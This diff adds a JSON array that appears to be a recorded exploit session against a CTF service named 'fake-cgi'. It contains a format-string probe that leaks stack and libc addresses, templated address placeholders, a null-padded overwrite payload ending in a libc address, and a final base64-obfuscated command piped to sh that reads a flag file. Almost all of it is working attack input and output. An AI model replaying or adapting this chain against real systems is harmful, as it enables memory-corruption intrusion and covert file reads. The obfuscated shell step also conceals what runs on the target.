@@ -1,0 +1,8 @@
+[
+    "1Wh{{{HEAP_BASE:90223:3:ORI:2:0x72206f}}} u?\\n", 
+    "0AAAAAAAA%5p:%6p:%7p:%8p\\n", 
+    "1welcome!AAAAAAAA0x{{{STACK_BASE:-11936:12:HEX:18:0x7ffcd6abe160}}}:0x{{{LIBC_BASE:3958656:12:HEX:33:0x7f91b849b780}}}:0x{{{LIBC_BASE:1012416:12:HEX:48:0x7f91b81cc2c0}}}:0x7f91b86c2700", 
+    "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:987463:8:ORI:72:0x7f91b81c6147}}}\\n", 
+    "1HTTP/1.1 404 Not Found\\r\\nContent-Type: text/html; c{{{HEAP_BASE:106856:3:ORI:50:0x726168}}}set=UTF-8\\r\\nContent-Length: 23\\r\\n{{{HEAP_BASE:107859:3:ORI:96:0x726553}}}{{{HEAP_BASE:107894:3:ORI:99:0x726576}}}: Easy{{{HEAP_BASE:107859:3:ORI:96:0x726553}}}{{{HEAP_BASE:107894:3:ORI:99:0x726576}}} (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>", 
+    "0echo \"Y2F0IC9mbGFncy9mYWtlLWNnaS9mbGFnIHxiYXNlNjQK\" |base64 -d |sh\\n"
+]
